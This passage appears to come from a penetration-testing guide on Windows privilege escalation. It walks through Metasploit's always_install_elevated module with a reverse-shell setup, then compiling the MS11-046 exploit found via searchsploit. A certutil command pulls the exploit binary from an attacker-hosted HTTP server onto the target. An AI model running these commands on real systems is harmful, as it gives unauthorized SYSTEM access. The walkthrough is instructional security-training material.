### **EXPLOITING WITH METASPLOIT**

1.  We discovered that the targetÂ  potentially vulnerable to the following kernel vulnerabilities:  
    
    ![](../../../img/Windows-Environment/15.png)

    **NOTE:** `exploit/windows/local/always_install_elevated` Enables privilege escalation by exploiting the AlwaysInstallElevated policy setting on Windows systems.
    
2.  For this exploit, we need to set the LHOST, LPORT, and SESSION fields. LPORT should be different from the port used in the initial exploit to get the Meterpreter session (which was 1338 in this case).
    
    ```
    use exploit/windows/local/always_install_elevated
    set SESSION 1
    set LHOST [IP-ADRESS]
    set LPORT [PORT]
    run
    ```
    
    ![](../../../img/Windows-Environment/16.png)
    
3.  Now, run the exploit, which should provide us with a SYSTEM shell.  
    
    ![](../../../img/Windows-Environment/17.png)
    

### **EXPLOITING WITH WINDOWS EXPLOIT SUGGESTER**

1.  Using Windows Exploit Suggester, we discovered that the target is potentially vulnerable to several kernel vulnerabilities.  
    `python3 wes.py systeminfo.txt -i 'Elevation of Privilege' --exploits-only`  
    
    ![](../../../img/Windows-Environment/18.png)
    
2.  We can download the exploit using searchsploit and compile it.
    
    ```
    searchsploit 40564
    searchsploit -m windows_x86/local/40564.c
    x86_64-w64-mingw32-gcc 40564.c -o ms11-046.exe -lws2_32
    ```
    
    ![](../../../img/Windows-Environment/19.png)
    
3.  Alternatively, we can search for a pre-compiled version of the exploit.  
    
    ![](../../../img/Windows-Environment/20.png)

    **NOTE:** Be cautious of executable files as they may contain malicious code or backdoors. Always download from trusted sources.
    
4.  MS11-046 pre-compiled exploit  
    
    ![](../../../img/Windows-Environment/21.png)
    
5.  To download Exploit Click on the raw download link to obtain the executable:  
    
    ![](../../../img/Windows-Environment/22.png)
    
6.  Transfer exploit to the target machine (see File Transfer section for details).  
    `python3 -m http.server 8000`  
    
    ![](../../../img/Windows-Environment/23.png)
    
7.  After executing the exploit, ensure the system remains stable and the privilege escalation is successful without causing crashes or other issues.  
    `certutil -urlcache -f http://[IP-ADRESS]:8000/ms11-046.exe ms11-046.exe`  
    
    ![](../../../img/Windows-Environment/24.png)